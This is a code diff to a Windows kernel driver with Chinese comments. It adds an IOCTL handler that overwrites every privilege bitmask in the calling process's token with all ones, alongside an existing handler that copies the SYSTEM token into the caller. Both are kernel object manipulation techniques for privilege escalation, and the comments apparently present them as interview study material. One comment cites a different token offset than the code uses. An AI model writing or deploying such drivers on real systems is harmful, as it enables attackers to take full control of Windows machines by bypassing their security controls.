@@ -2,7 +2,15 @@
 
 // IOCTL Code
 #define IOCTL_STEAL_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_PATCH_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+typedef struct _SEP_TOKEN_PRIVILEGES {
+    UINT64 Present;
+    UINT64 Enabled;
+    UINT64 EnabledByDefault;
+} SEP_TOKEN_PRIVILEGES, * PSEP_TOKEN_PRIVILEGES;
+
+#define TOKEN_PRIVILEGES_OFFSET 0x40 
 #define TOKEN_OFFSET 0x248 
 
 void DriverUnload(PDRIVER_OBJECT pDriverObject) {
@@ -31,12 +39,42 @@ NTSTATUS StealTokenHandler() {
     UINT64* pCurrentToken = (UINT64*)((UINT64)CurrentProcess + TOKEN_OFFSET);
 
     // DKOM (Direct Kernel Object Manipulation)
-	// overwrite current process token with system process token
+    // overwrite current process token with system process token
     DbgPrint("[*] Old Token: %llx\n", *pCurrentToken);
     *pCurrentToken = *pSystemToken;
     DbgPrint("[*] New Token (Stolen): %llx\n", *pCurrentToken);
 
     ObDereferenceObject(SystemProcess);
+
+    return STATUS_SUCCESS;
+}
+
+NTSTATUS PatchTokenHandler() {
+    PEPROCESS CurrentProcess = PsGetCurrentProcess();
+
+    // 1. 取得當前 Process 的 Token (EX_FAST_REF)
+    // 記得：這是從 EPROCESS + 0x4b8 (假設) 讀出來的值
+    UINT64* pFastRefToken = (UINT64*)((UINT64)CurrentProcess + TOKEN_OFFSET);
+    UINT64 FastRefValue = *pFastRefToken;
+
+    // 2. 【關鍵面試題】解碼 Token Address
+    // 因為低 4 位是 RefCount，必須遮罩掉才能當作指標使用
+    // ~0xF 等於 ...11110000
+    UINT64 TokenAddress = FastRefValue & ~0xF;
+
+    DbgPrint("[*] Current Token Address: %llx\n", TokenAddress);
+
+    // 3. 計算 Privileges 的位置
+    // Token Address + 0x40
+    PSEP_TOKEN_PRIVILEGES pPrivileges = (PSEP_TOKEN_PRIVILEGES)(TokenAddress + TOKEN_PRIVILEGES_OFFSET);
+
+    // 4. 開外掛：將所有權限設為全開 (0xFFFFFFFFFFFFFFFF)
+    // 這代表開啟了 SeDebugPrivilege, SeTcbPrivilege 等等所有權限
+    pPrivileges->Present = 0xFFFFFFFFFFFFFFFF;
+    pPrivileges->Enabled = 0xFFFFFFFFFFFFFFFF;
+    pPrivileges->EnabledByDefault = 0xFFFFFFFFFFFFFFFF;
+
+    DbgPrint("[+] Token Privileges Patched! You are now god-like.\n");
 
     return STATUS_SUCCESS;
 }
@@ -55,6 +93,10 @@ NTSTATUS DriverDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
         if (pIoStackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_STEAL_TOKEN) {
             DbgPrint("[+] IOCTL Received. Starting Token Stealing...\n");
             status = StealTokenHandler();
+        }
+        else if (pIoStackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_PATCH_TOKEN) {
+            DbgPrint("[+] IOCTL_PATCH_TOKEN Received.\n");
+            status = PatchTokenHandler();
         }
         break;
     default:
